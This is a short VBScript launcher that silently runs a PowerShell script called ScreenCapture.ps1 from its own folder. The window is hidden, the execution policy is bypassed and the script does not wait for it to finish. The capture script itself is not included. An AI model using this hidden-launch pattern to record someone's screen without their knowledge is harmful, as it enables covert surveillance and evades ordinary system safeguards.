Dim shell : Set shell = CreateObject("WScript.Shell")
Dim fso   : Set fso   = CreateObject("Scripting.FileSystemObject")
Dim dir   : dir = fso.GetParentFolderName(WScript.ScriptFullName)
shell.Run "powershell.exe -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -File """ & dir & "\ScreenCapture.ps1""", 0, False
